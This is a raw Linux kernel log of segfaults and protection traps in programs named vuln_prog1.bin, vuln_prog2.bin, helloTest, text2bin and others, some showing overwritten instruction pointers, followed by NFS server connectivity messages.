[2287245.971959] vuln_prog1.bin[18764]: segfault at a4141414141 ip 0000558bb2913a8b sp 00007ffef76df5c0 error 4 in vuln_prog1.bin[558bb2913000+1000]
[2287252.007833] vuln_prog1.bin[18768]: segfault at 557f003c600a ip 0000557f003c600a sp 00007ffd1bcbfa40 error 14 in vuln_prog1.bin[557fd815b000+1000]
[2287294.802480] traps: vuln_prog1.bin[18777] trap stack segment ip:56078eb2ba09 sp:7fff497199b0 error:0 in vuln_prog1.bin[56078eb2b000+1000]
[2287307.723120] traps: vuln_prog1.bin[18781] trap stack segment ip:561d2f4fba8b sp:7ffd4f828980 error:0 in vuln_prog1.bin[561d2f4fb000+1000]
[2287790.564428] vuln_prog1.bin[19037]: segfault at 0 ip           (null) sp 00007ffd824d001a error 14 in vuln_prog1.bin[5576d628b000+1000]
[2288075.247447] vuln_prog1.bin[19101]: segfault at 7ffe003c0a41 ip 0000558b58fc5a8b sp 00007ffe5826aec0 error 4 in vuln_prog1.bin[558b58fc5000+1000]
[2288101.614249] vuln_prog1.bin[19117]: segfault at 55c6003c0a41 ip 000055c6003c0a41 sp 00007ffd77d158f0 error 14 in vuln_prog1.bin[55c667007000+1000]
[2288140.438592] vuln_prog1.bin[19130]: segfault at 5651003c600a ip 00005651003c600a sp 00007ffdb6196b20 error 14 in vuln_prog1.bin[56512673f000+1000]
[2288201.234591] traps: vuln_prog1.bin[19142] trap stack segment ip:55569ea9fa09 sp:7ffe84d39900 error:0 in vuln_prog1.bin[55569ea9f000+1000]
[2288213.481823] traps: vuln_prog1.bin[19146] trap stack segment ip:5602f0777a8b sp:7ffd29df5550 error:0 in vuln_prog1.bin[5602f0777000+1000]
[2288361.518794] traps: vuln_prog1.bin[19169] general protection ip:55fe1a5f4a8c sp:7fff36430012 error:0 in vuln_prog1.bin[55fe1a5f4000+1000]
[2288443.047338] vuln_prog1.bin[19192]: segfault at 55eb003c600a ip 000055eb003c600a sp 00007ffe94a83470 error 14 in vuln_prog1.bin[55ebb0487000+1000]
[2288458.275660] traps: vuln_prog1.bin[19197] trap stack segment ip:55f8cdcf1a09 sp:7fff0d0d68e0 error:0 in vuln_prog1.bin[55f8cdcf1000+1000]
[2288513.997149] vuln_prog1.bin[19207]: segfault at a41414141 ip 0000559510a0ca8b sp 00007ffeca44e350 error 4 in vuln_prog1.bin[559510a0c000+1000]
[2288524.002484] vuln_prog1.bin[19212]: segfault at 7f000a414141 ip 000055ddf0c2aa8b sp 00007ffc7ac46ed0 error 4 in vuln_prog1.bin[55ddf0c2a000+1000]
[2288535.681154] vuln_prog1.bin[19216]: segfault at a4141414141 ip 000055a27dd56a8b sp 00007ffeccd9f730 error 4 in vuln_prog1.bin[55a27dd56000+1000]
[2288549.849054] vuln_prog1.bin[19221]: segfault at 5588003c600a ip 00005588003c600a sp 00007ffed0fe5ce0 error 14 in vuln_prog1.bin[558875b97000+1000]
[2288572.920185] vuln_prog1.bin[19227]: segfault at 5607160009a0 ip 00005607160009a0 sp 00007ffe71a97110 error 14 in vuln_prog1.bin[5607161c3000+1000]
[2288792.082169] vuln_prog1.bin[19277]: segfault at 7ffdce0009a0 ip 0000560ea7d71a8b sp 00007ffdce471270 error 4 in vuln_prog1.bin[560ea7d71000+1000]
[2288805.885501] traps: vuln_prog1.bin[19282] general protection ip:5574d9d99a25 sp:7fff8423e1f8 error:0 in vuln_prog1.bin[5574d9d99000+1000]
[2289297.618521] vuln_prog1.bin[19508]: segfault at 557c000a09a0 ip 0000557c000a09a0 sp 00007ffe7086b880 error 14 in vuln_prog1.bin[557c8a087000+1000]
[2289308.781527] traps: vuln_prog1.bin[19512] trap stack segment ip:55e176121a8b sp:7ffe22340540 error:0 in vuln_prog1.bin[55e176121000+1000]
[2289316.500557] vuln_prog1.bin[19516]: segfault at 7ffe000a09a0 ip 000056308384fa8b sp 00007ffe8ffe3a10 error 4 in vuln_prog1.bin[56308384f000+1000]
[2289322.148372] vuln_prog1.bin[19520]: segfault at 55000a09a041 ip 000055000a09a041 sp 00007fff4cf36910 error 14 in vuln_prog1.bin[556b0b891000+1000]
[2289328.706741] vuln_prog1.bin[19524]: segfault at 561e003c0a09 ip 0000561e003c0a09 sp 00007ffe096e9090 error 14 in vuln_prog1.bin[561ed90f1000+1000]
[2289951.342254] vuln_prog1.bin[19848]: segfault at 55d7700009a0 ip 000055d7700009a0 sp 00007ffdb3e55900 error 14 in vuln_prog1.bin[55d770384000+1000]
[2289961.366543] vuln_prog1.bin[19852]: segfault at 9a041414141 ip 000055fba1d54a8b sp 00007ffc7020f3a0 error 4 in vuln_prog1.bin[55fba1d54000+1000]
[2289974.173363] vuln_prog1.bin[19857]: segfault at 7f0009a04141 ip 0000559a406d9a8b sp 00007ffff4ddb080 error 4 in vuln_prog1.bin[559a406d9000+1000]
[2289992.804565] vuln_prog1.bin[19867]: segfault at 9a0414141 ip 000055c479381a8b sp 00007ffe8a083a40 error 4 in vuln_prog1.bin[55c479381000+1000]
[2290054.289903] vuln_prog1.bin[19880]: segfault at 5599760009a0 ip 00005599760009a0 sp 00007ffd8bd9b680 error 14 in vuln_prog1.bin[5599765f9000+1000]
[2290068.176360] traps: vuln_prog1.bin[19884] general protection ip:5620ed23aa25 sp:7ffdf7276df8 error:0 in vuln_prog1.bin[5620ed23a000+1000]
[2290093.742922] traps: vuln_prog1.bin[19891] general protection ip:55f336a28a25 sp:7ffefd0d0278 error:0 in vuln_prog1.bin[55f336a28000+1000]
[2290103.102473] vuln_prog1.bin[19895]: segfault at 550009a04141 ip 0000550009a04141 sp 00007ffe3f1535e0 error 14 in vuln_prog1.bin[558479e12000+1000]
[2290110.926650] vuln_prog1.bin[19899]: segfault at 55a09aa10009 ip 000055a09aa10009 sp 00007ffff7210b20 error 14 in vuln_prog1.bin[55a09aa1e000+1000]
[2290118.920296] vuln_prog1.bin[19903]: segfault at 55f80009a041 ip 000055f80009a041 sp 00007ffd1323caf0 error 14 in vuln_prog1.bin[55f889c8d000+1000]
[2290222.701644] traps: helloTest[19945] general protection ip:7fe8c01c4b09 sp:7ffe247f4000 error:0 in libc-2.23.so[7fe8c0157000+1c0000]
[2290267.651240] traps: helloTest[19978] general protection ip:7ff28b14ab09 sp:7ffc8bb1f320 error:0 in libc-2.23.so[7ff28b0dd000+1c0000]
[2290359.499292] traps: helloTest[20059] general protection ip:7efd134a9b09 sp:7fff3c02bac0 error:0 in libc-2.23.so[7efd1343c000+1c0000]
[2291220.794597] traps: helloTest[20316] general protection ip:7f06dc200b09 sp:7ffe42774560 error:0 in libc-2.23.so[7f06dc193000+1c0000]
[2291227.489173] traps: helloTest[20327] general protection ip:7fdc83cf4b09 sp:7ffe4228d1d0 error:0 in libc-2.23.so[7fdc83c87000+1c0000]
[2291233.021950] traps: helloTest[20335] general protection ip:7f5a675e5b09 sp:7ffd95f84d50 error:0 in libc-2.23.so[7f5a67578000+1c0000]
[2291327.018025] traps: helloTest[20388] general protection ip:7fa97e5c9b09 sp:7fff5fb2d410 error:0 in libc-2.23.so[7fa97e55c000+1c0000]
[2291356.079475] traps: helloTest[20406] general protection ip:7fd47273cb09 sp:7ffdb65d3be0 error:0 in libc-2.23.so[7fd4726cf000+1c0000]
[2291361.060355] traps: helloTest[20414] general protection ip:7f90252f7b09 sp:7ffd9a103a80 error:0 in libc-2.23.so[7f902528a000+1c0000]
[2291610.703453] traps: helloTest[20679] general protection ip:7fbf47f3ab09 sp:7ffc64cc0d50 error:0 in libc-2.23.so[7fbf47ecd000+1c0000]
[2291683.384860] traps: helloTest[20715] general protection ip:7f730f2dfb09 sp:7ffed6851b30 error:0 in libc-2.23.so[7f730f272000+1c0000]
[2291800.926471] traps: helloTest[20747] general protection ip:7f0e1ec8704d sp:7ffca4a22440 error:0 in libc-2.23.so[7f0e1ec11000+1c0000]
[2292908.335871] traps: helloTest[21132] general protection ip:7f4c5911304d sp:7ffd3e2e4530 error:0 in libc-2.23.so[7f4c5909d000+1c0000]
[2292910.915935] traps: helloTest[21135] general protection ip:7f384526f04d sp:7ffefb7b75f0 error:0 in libc-2.23.so[7f38451f9000+1c0000]
[2292961.352462] traps: helloTest[21163] general protection ip:7f41dc8e304d sp:7ffd7f9126b0 error:0 in libc-2.23.so[7f41dc86d000+1c0000]
[2292974.143830] traps: helloTest[21171] general protection ip:7f9e3d8a504d sp:7ffca6fac0e0 error:0 in libc-2.23.so[7f9e3d82f000+1c0000]
[2294359.519304] traps: bin2indexed[21681] general protection ip:7f8cd21f4042 sp:7fffc46db3b0 error:0 in libc-2.23.so[7f8cd2186000+1c0000]
[2294466.405893] traps: bin2indexed[21716] general protection ip:7f89c6a2b042 sp:7ffe601d0080 error:0 in libc-2.23.so[7f89c69bd000+1c0000]
[2294628.477896] traps: bin2indexed[21754] general protection ip:7f308eac3042 sp:7fff058530c0 error:0 in libc-2.23.so[7f308ea55000+1c0000]
[2303864.908109] a.out[24848]: segfault at 0 ip 00007f492422ec80 sp 00007ffe14aa7880 error 6 in libc-2.23.so[7f49241c0000+1c0000]
[2303983.245842] a.out[25020]: segfault at 0 ip 00007f7ebd4a3c80 sp 00007ffda04a8b20 error 6 in libc-2.23.so[7f7ebd435000+1c0000]
[2304206.590977] traps: helloTest[25085] general protection ip:7f06a88ed04d sp:7fffc22a2790 error:0 in libc-2.23.so[7f06a8877000+1c0000]
[2304620.400396] traps: helloTest[25323] general protection ip:7fa84afd971a sp:7ffeccb29960 error:0 in libc-2.23.so[7fa84af6b000+1c0000]
[2304631.793862] traps: helloTest[25328] general protection ip:7f0dcd45971a sp:7ffcdc19ddb0 error:0 in libc-2.23.so[7f0dcd3eb000+1c0000]
[2304644.103524] traps: helloTest[25333] general protection ip:7f949821071a sp:7ffcdd2dab10 error:0 in libc-2.23.so[7f94981a2000+1c0000]
[2304721.894280] traps: helloTest[25354] general protection ip:7f9fda86171a sp:7fff086829f0 error:0 in libc-2.23.so[7f9fda7f3000+1c0000]
[2306268.613275] helloTest[25843]: segfault at ffffffffa3788e70 ip 00007f9d4d907cc0 sp 00007ffda37887e0 error 5 in libc-2.23.so[7f9d4d8b9000+1c0000]
[2306322.636507] helloTest[25864]: segfault at 23a837a0 ip 00007f0b7317fcc0 sp 00007fff23a83110 error 4 in libc-2.23.so[7f0b73131000+1c0000]
[2306464.304696] fug[25902]: segfault at 762254d0 ip 00007f65619f1454 sp 00007ffd76225430 error 4 in libc-2.23.so[7f65619b6000+1c0000]
[2306540.338636] helloTest[25926]: segfault at 7d2c6640 ip 00007fc397f21cc0 sp 00007ffd7d2c5fb0 error 4 in libc-2.23.so[7fc397ed3000+1c0000]
[2306573.340528] helloTest[25945]: segfault at 200aadb0 ip 00007f6cc5470cc0 sp 00007ffd200aa720 error 4 in libc-2.23.so[7f6cc5422000+1c0000]
[2306648.283152] helloTest[25992]: segfault at ffffffff9251d1b0 ip 00007f89dda48cc0 sp 00007fff9251cb20 error 5 in libc-2.23.so[7f89dd9fa000+1c0000]
[2306682.602368] helloTest[26015]: segfault at 2b6f0d90 ip 00007f8603165cc0 sp 00007ffd2b6f0700 error 4 in libc-2.23.so[7f8603117000+1c0000]
[2306709.024706] helloTest[26032]: segfault at ffffffff903edfd0 ip 00007f7f968ffcc0 sp 00007ffe903ed940 error 5 in libc-2.23.so[7f7f968b1000+1c0000]
[2306738.968706] helloTest[26055]: segfault at ffffffffde5f0310 ip 00007ff0b185acc0 sp 00007ffdde5efc80 error 5 in libc-2.23.so[7ff0b180c000+1c0000]
[2307142.071357] helloTest[26213]: segfault at ffffffffa5817f80 ip 00007f1c35817746 sp 00007ffca5817f28 error 5 in libc-2.23.so[7f1c3578c000+1c0000]
[2307658.767216] helloTest[26453]: segfault at 6c6dab00 ip 00007f7c9e7a3746 sp 00007fff6c6daaa8 error 4 in libc-2.23.so[7f7c9e718000+1c0000]
[2307803.076725] helloTest[26492]: segfault at ffffffffff5cdcd0 ip 00007f8d0f366746 sp 00007fffff5cdc78 error 5 in libc-2.23.so[7f8d0f2db000+1c0000]
[2337928.371171] text2bin[2883]: segfault at 31 ip 00007fa8100956cc sp 00007fffd1870ca8 error 4 in libc-2.23.so[7fa810007000+1c0000]
[2337932.214841] text2bin[2885]: segfault at 31 ip 00007f90f99fc6cc sp 00007ffe9c769f48 error 4 in libc-2.23.so[7f90f996e000+1c0000]
[2338464.748854] text2bin[3198]: segfault at ffffffffa7706da0 ip 00007fda05513924 sp 00007fffa7706d10 error 5 in libc-2.23.so[7fda054d8000+1c0000]
[2339239.679819] text2bin[3443]: segfault at 3a478150 ip 00007f51c2257924 sp 00007fff3a4780c0 error 4 in libc-2.23.so[7f51c221c000+1c0000]
[2339353.184044] text2bin[3467]: segfault at ffffffffe81aa520 ip 00007f132be32924 sp 00007ffde81aa490 error 5 in libc-2.23.so[7f132bdf7000+1c0000]
[2339427.057776] text2bin[3491]: segfault at ffffffff881f3ce0 ip 00007f8416cfb924 sp 00007ffc881f3c50 error 5 in libc-2.23.so[7f8416cc0000+1c0000]
[2339509.167199] text2bin[3514]: segfault at 0 ip 00007f1d32b20472 sp 00007ffc2520b868 error 4 in libc-2.23.so[7f1d32a91000+1c0000]
[2339675.461080] text2bin[3569]: segfault at 37e56f80 ip 00007feb2b308924 sp 00007ffd37e56ef0 error 4 in libc-2.23.so[7feb2b2cd000+1c0000]
[2339755.080445] text2bin[3598]: segfault at ffffffff98172ed0 ip 00007efd7a6a0924 sp 00007ffc98172e40 error 5 in libc-2.23.so[7efd7a665000+1c0000]
[2345050.955809] traps: out[5179] trap invalid opcode ip:400600 sp:7fff7bca9738 error:0 in out[400000+1000]
[2346009.693026] vuln_prog1.bin[5521]: segfault at 5566930009a0 ip 00005566930009a0 sp 00007ffee160b7a0 error 14 in vuln_prog1.bin[55669363f000+1000]
[2346624.375946] vuln_prog1.bin[5744]: segfault at 7ffe280009a0 ip 0000562eb2d5ea8b sp 00007ffe280719d0 error 4 in vuln_prog1.bin[562eb2d5e000+1000]
[2346658.842108] vuln_prog1.bin[5752]: segfault at 561e390009a0 ip 0000561e390009a0 sp 00007ffcd76ecf80 error 14 in vuln_prog1.bin[561e39df3000+1000]
[2346678.578006] vuln_prog1.bin[5757]: segfault at 55eb0009a061 ip 000055eb0009a061 sp 00007ffe8a5954e0 error 14 in vuln_prog1.bin[55eb87f8c000+1000]
[2346686.592845] vuln_prog1.bin[5762]: segfault at 550009a06161 ip 0000550009a06161 sp 00007ffff2efe920 error 14 in vuln_prog1.bin[55cae79aa000+1000]
[2346694.772306] vuln_prog1.bin[5765]: segfault at 9a0616161 ip 00000009a0616161 sp 00007ffd4e2ed620 error 14 in vuln_prog1.bin[55c6a10a3000+1000]
[2346701.841137] vuln_prog1.bin[5770]: segfault at 9a061616161 ip 000009a061616161 sp 00007ffc360f7220 error 14 in vuln_prog1.bin[56514db51000+1000]
[2362904.469687] helloTest[12543]: segfault at 3486d285 ip 00007f0f5ab01440 sp 00007ffec956cb68 error 4 in libc-2.23.so[7f0f5aa72000+1c0000]
[2363009.068286] helloTest[12609]: segfault at c4 ip 00007f3ead284676 sp 00007ffdabf1d240 error 4 in libc-2.23.so[7f3ead209000+1c0000]
[2363039.734543] helloTest[12626]: segfault at c4 ip 00007efec2312676 sp 00007ffce4094790 error 4 in libc-2.23.so[7efec2297000+1c0000]
[2363094.768948] helloTest[12663]: segfault at c4 ip 00007fc85d8e1676 sp 00007ffc7cf1a6f0 error 4 in libc-2.23.so[7fc85d866000+1c0000]
[2363911.103662] helloTest[13100]: segfault at c4 ip 00007fe4d7fbe440 sp 00007ffcb9aeb4f8 error 4 in libc-2.23.so[7fe4d7f2f000+1c0000]
[2363929.679731] helloTest[13110]: segfault at c4 ip 00007fbed5763440 sp 00007ffd040aa358 error 4 in libc-2.23.so[7fbed56d4000+1c0000]
[2364045.808188] helloTest[13190]: segfault at c4 ip 00007f77207d6676 sp 00007ffe2b72a320 error 4 in libc-2.23.so[7f772075b000+1c0000]
[2368447.870458] meme[15238]: segfault at 30 ip 00007fa63d1d1828 sp 00007ffc9d8249a8 error 4 in libc-2.23.so[7fa63d129000+1c0000]
[2368515.666434] meme[15266]: segfault at 30 ip 00007f91d8603828 sp 00007ffd7aa8a308 error 4 in libc-2.23.so[7f91d855b000+1c0000]
[2370445.980906] test[16019]: segfault at 31 ip 00007efe3bdd3cc0 sp 00007ffd290cc250 error 4 in libc-2.23.so[7efe3bd85000+1c0000]
[2370500.292572] test[16053]: segfault at 31 ip 00007f94c164d454 sp 00007ffdb0dd9a30 error 4 in libc-2.23.so[7f94c1612000+1c0000]
[2370517.259186] test[16075]: segfault at 31 ip 00007f464558d454 sp 00007ffc95c150a0 error 4 in libc-2.23.so[7f4645552000+1c0000]
[2370559.784596] test[16097]: segfault at 31 ip 00007fc126546454 sp 00007fffb7501c90 error 4 in libc-2.23.so[7fc12650b000+1c0000]
[2370561.867859] test[16099]: segfault at 31 ip 00007f0255b5d454 sp 00007fff12b66280 error 4 in libc-2.23.so[7f0255b22000+1c0000]
[2370569.935132] test[16110]: segfault at 31 ip 00007f90d2900454 sp 00007ffc1aaa7b50 error 4 in libc-2.23.so[7f90d28c5000+1c0000]
[2370632.960796] test[16283]: segfault at 31 ip 00007f274e2f4454 sp 00007ffef3071860 error 4 in libc-2.23.so[7f274e2b9000+1c0000]
[2370638.550260] test[16291]: segfault at 31 ip 00007f11e06b3454 sp 00007ffc8b840f20 error 4 in libc-2.23.so[7f11e0678000+1c0000]
[2370712.788456] test[16325]: segfault at 39 ip 00007f40aa25f454 sp 00007fff4b9271b0 error 4 in libc-2.23.so[7f40aa224000+1c0000]
[2370827.504371] meme[16390]: segfault at 31 ip 00007f4431eae454 sp 00007ffcab188a60 error 4 in libc-2.23.so[7f4431e73000+1c0000]
[2370871.553842] test[16404]: segfault at 31 ip 00007f4adaba1cc0 sp 00007fff2d906fb0 error 4 in libc-2.23.so[7f4adab53000+1c0000]
[2371875.457681] test[17100]: segfault at 31 ip 00007fc7025fbcc0 sp 00007ffe4afc0a40 error 4 in libc-2.23.so[7fc7025ad000+1c0000]
[2372029.795178] test[17199]: segfault at 160 ip 00007f691980fcc0 sp 00007ffc554cfad0 error 4 in libc-2.23.so[7f69197c1000+1c0000]
[2372071.082431] text2bin[17224]: segfault at 1 ip 00007f2990301454 sp 00007ffd48f925b0 error 4 in libc-2.23.so[7f29902c6000+1c0000]
[2372146.967255] text2bin[17305]: segfault at 1 ip 00007f4ec5090454 sp 00007ffcb57e1db0 error 4 in libc-2.23.so[7f4ec5055000+1c0000]
[2372980.148521] text2bin[17806]: segfault at 0 ip 00007fb32fe8c454 sp 00007ffdeeedec00 error 4 in libc-2.23.so[7fb32fe51000+1c0000]
[2373039.178875] text2bin[17927]: segfault at 0 ip 00007f94900e5454 sp 00007ffdf8140120 error 4 in libc-2.23.so[7f94900aa000+1c0000]
[2373266.920749] t2b[18052]: segfault at c4 ip 00007f6c32834676 sp 00007ffc6b821f80 error 4 in libc-2.23.so[7f6c327b9000+1c0000]
[2373384.121019] t2b[18110]: segfault at c4 ip 00007faa70768676 sp 00007ffc098313a0 error 4 in libc-2.23.so[7faa706ed000+1c0000]
[2373487.998959] t2b[18242]: segfault at 5 ip 00007f88d2fa5676 sp 00007ffe31dd9710 error 4 in libc-2.23.so[7f88d2f2a000+1c0000]
[2373516.669833] t2b[18260]: segfault at 5 ip 00007f4e19a72676 sp 00007fff2b1939e0 error 4 in libc-2.23.so[7f4e199f7000+1c0000]
[2373537.103803] t2b[18294]: segfault at 5 ip 00007eff3560c440 sp 00007ffc5f872ac8 error 4 in libc-2.23.so[7eff3557d000+1c0000]
[2373591.072402] t2b[18314]: segfault at 5 ip 0000000000400894 sp 00007ffdc4bbf4d0 error 4 in t2b[400000+1000]
[2373784.900193] t2b[18403]: segfault at 7ffcc0b44000 ip 00007f59772914fb sp 00007ffcc0b41cf8 error 4 in libc-2.23.so[7f5977202000+1c0000]
[2373921.549143] t2b[18576]: segfault at 7ffe32f99000 ip 00007fb0400894fb sp 00007ffe32f970f8 error 4 in libc-2.23.so[7fb03fffa000+1c0000]
[2374649.039934] text2bin[19108]: segfault at 31 ip 00007f84ec72b924 sp 00007fff0646a570 error 4 in libc-2.23.so[7f84ec6f0000+1c0000]
[2374764.786498] b2t[19156]: segfault at ffffffffffffffc4 ip 00007ff693697454 sp 00007ffd60768fe0 error 5 in libc-2.23.so[7ff69365c000+1c0000]
[2374792.464909] text2bin[19179]: segfault at 31 ip 00007f00f608c924 sp 00007ffe049d0150 error 4 in libc-2.23.so[7f00f6051000+1c0000]
[2377052.884055] text2bin[20418]: segfault at 0 ip 00007fed4589c4fb sp 00007ffc074c01f8 error 4 in libc-2.23.so[7fed4580d000+1c0000]
[2377440.768011] text2bin[20576]: segfault at 0 ip 00007fe9831dd924 sp 00007ffd0f749cb0 error 4 in libc-2.23.so[7fe9831a2000+1c0000]
[2377515.255705] text2bin[20614]: segfault at 0 ip 00007f73eed274fb sp 00007fffad6d8bd8 error 4 in libc-2.23.so[7f73eec98000+1c0000]
[2377519.460129] text2bin[20616]: segfault at 0 ip 00007f2f367a54fb sp 00007ffc426382f8 error 4 in libc-2.23.so[7f2f36716000+1c0000]
[2377569.689981] text2bin[20639]: segfault at 52 ip 00007f2bec7da440 sp 00007ffc685778f8 error 4 in libc-2.23.so[7f2bec74b000+1c0000]
[2377926.728155] text2bin[20924]: segfault at 0 ip 00007fb1d8eb24fb sp 00007ffc37caf1c8 error 4 in libc-2.23.so[7fb1d8e23000+1c0000]
[2378046.180838] a.out[21021]: segfault at 0 ip 00007fa3f7931454 sp 00007ffea72e11d0 error 4 in libc-2.23.so[7fa3f78f6000+1c0000]
[2378254.531101] text2bin[21076]: segfault at 0 ip 00007fe4bd7694fb sp 00007ffd762dee58 error 4 in libc-2.23.so[7fe4bd6da000+1c0000]
[2378325.270334] text2bin[21116]: segfault at 0 ip 00007f9e288864fb sp 00007ffc1f98c9f8 error 4 in libc-2.23.so[7f9e287f7000+1c0000]
[2378342.178336] text2bin[21132]: segfault at 52 ip 00007fb62b219440 sp 00007ffe155024b8 error 4 in libc-2.23.so[7fb62b18a000+1c0000]
[2378601.250421] text2bin[21231]: segfault at 0 ip 00007f4286f224fb sp 00007ffc368c4068 error 4 in libc-2.23.so[7f4286e93000+1c0000]
[2378717.414838] text2bin[21274]: segfault at 0 ip 00007fc5110904fb sp 00007ffc253c5588 error 4 in libc-2.23.so[7fc511001000+1c0000]
[2424407.805396] b2t[2308]: segfault at 0 ip 00007f141cd1a491 sp 00007ffd2f859fb8 error 6 in libc-2.23.so[7f141cc86000+1c0000]
[2424433.237203] b2t[2320]: segfault at 0 ip 00007f84ad007491 sp 00007ffc3d20b898 error 6 in libc-2.23.so[7f84acf73000+1c0000]
[2424460.420720] b2t[2339]: segfault at 0 ip 00007ff3ff2ba491 sp 00007fff13bb0518 error 6 in libc-2.23.so[7ff3ff226000+1c0000]
[2424463.952451] b2t[2346]: segfault at 0 ip 00007fe21ab66491 sp 00007fffb008c8c8 error 6 in libc-2.23.so[7fe21aad2000+1c0000]
[2425317.545752] b2t[2849]: segfault at 3486 ip 00007f6b26e201ba sp 00007ffe86f160a0 error 4 in libc-2.23.so[7f6b26db2000+1c0000]
[2427677.146174] a.out[4019]: segfault at 0 ip 00007f97285b0454 sp 00007ffd312c2530 error 4 in libc-2.23.so[7f9728575000+1c0000]
[2438709.541592] text2bin[9194]: segfault at 30703010 ip 00007fa53035bcc0 sp 00007ffdffdbb920 error 4 in libc-2.23.so[7fa53030d000+1c0000]
[2444295.660751] traps: vuln_prog2.bin[11098] general protection ip:7ffff7a5bcc0 sp:7fffffffbea0 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[2444899.590110] traps: vuln_prog2.bin[11465] general protection ip:7ffff7a5bcc0 sp:7fffffffbea0 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[2444919.364989] traps: vuln_prog2.bin[11471] trap stack segment ip:555555554a04 sp:7fffffffc618 error:0 in vuln_prog2.bin[555555554000+1000]
[2444926.148621] traps: vuln_prog2.bin[11474] trap stack segment ip:555555554a04 sp:7fffffffc618 error:0 in vuln_prog2.bin[555555554000+1000]
[2444927.076696] traps: vuln_prog2.bin[11476] trap stack segment ip:555555554a04 sp:7fffffffc618 error:0 in vuln_prog2.bin[555555554000+1000]
[2446160.297791] traps: vuln_prog2.bin[12105] trap stack segment ip:555555554a04 sp:7fffffffc618 error:0 in vuln_prog2.bin[555555554000+1000]
[2446167.583888] vuln_prog2.bin[12109]: segfault at 555555004141 ip 0000555555004141 sp 00007fffffffc640 error 14 in vuln_prog2.bin[555555554000+1000]
[2447805.377987] vuln_prog2.bin[12830]: segfault at ffffffffffffffdc ip 0000555555554a04 sp 00007fffffffc618 error 7 in vuln_prog2.bin[555555554000+1000]
[2448018.976704] vuln_prog1.bin[13047]: segfault at 5632000a49a0 ip 00005632000a49a0 sp 00007ffcd5022370 error 14 in vuln_prog1.bin[56322f482000+1000]
[2448023.986784] vuln_prog2.bin[13053]: segfault at ffffffffffffffdc ip 0000555555554a04 sp 00007fffffffc618 error 7 in vuln_prog2.bin[555555554000+1000]
[2465007.615578] t2b[19870]: segfault at 0 ip 00007f9332bb5c80 sp 00007ffe9ebd08c0 error 6 in libc-2.23.so[7f9332b47000+1c0000]
[2465818.050877] t2b[20274]: segfault at 0 ip 00007f7a267efc80 sp 00007ffe93cc4e00 error 6 in libc-2.23.so[7f7a26781000+1c0000]
[2465845.026186] t2b[20294]: segfault at 0 ip 00007f8ab453ac80 sp 00007ffe01c1f910 error 6 in libc-2.23.so[7f8ab44cc000+1c0000]
[2466106.317542] t2b[20576]: segfault at 0 ip 00007fb7c277fc80 sp 00007ffd49236fb0 error 6 in libc-2.23.so[7fb7c2711000+1c0000]
[2472858.119818] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2473041.484271] nfs: server vader.srcit.stevens-tech.edu OK
[2473863.929818] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2473877.401620] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2473950.008681] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2474063.543072] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2474119.870263] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2474315.244240] nfs: server vader.srcit.stevens-tech.edu OK
[2474495.265075] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2477443.353036] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2477484.268491] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2477484.268543] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2480515.327652] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2480515.327697] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2481020.440983] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2481456.371284] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2502015.586294] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2502015.586338] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2502015.586366] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2502015.586379] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2502015.586392] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2505757.280024] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280095] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280125] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280179] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280291] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280317] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280554] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280751] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280783] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280785] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280814] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.280989] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.284037] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.297865] nfs: server vader.srcit.stevens-tech.edu OK
[2505757.297941] nfs: server vader.srcit.stevens-tech.edu OK
[2505758.118757] nfs: server vader.srcit.stevens-tech.edu OK
[2505758.118894] nfs: server vader.srcit.stevens-tech.edu OK
[2510894.953833] b2i[3564]: segfault at 0 ip 00007fa041e131ba sp 00007ffc600e0d70 error 4 in libc-2.23.so[7fa041da5000+1c0000]
[2510947.859706] b2i[3604]: segfault at 0 ip 00007f1bc0e631ba sp 00007ffc8a1a4a20 error 4 in libc-2.23.so[7f1bc0df5000+1c0000]
[2510961.845203] b2i[3614]: segfault at 0 ip 00007fe1848611ba sp 00007fff21d56c90 error 4 in libc-2.23.so[7fe1847f3000+1c0000]
[2510984.144059] b2i[3789]: segfault at 0 ip 00007f15610071ba sp 00007ffcc8b11410 error 4 in libc-2.23.so[7f1560f99000+1c0000]
[2510995.220120] b2i[3796]: segfault at 0 ip 00007f01667cc1ba sp 00007ffc32a51dd0 error 4 in libc-2.23.so[7f016675e000+1c0000]
[2511020.816242] b2i[3809]: segfault at 0 ip 00007fd6110f91ba sp 00007ffc168ab110 error 4 in libc-2.23.so[7fd61108b000+1c0000]
[2511025.455249] b2i[3817]: segfault at 0 ip 00007f3147c39264 sp 00007ffe4a48f1b0 error 4 in libc-2.23.so[7f3147bcc000+1c0000]
[2511063.326836] b2i[3856]: segfault at 0 ip 00007feb6829e1ba sp 00007ffea14ffa10 error 4 in libc-2.23.so[7feb68230000+1c0000]
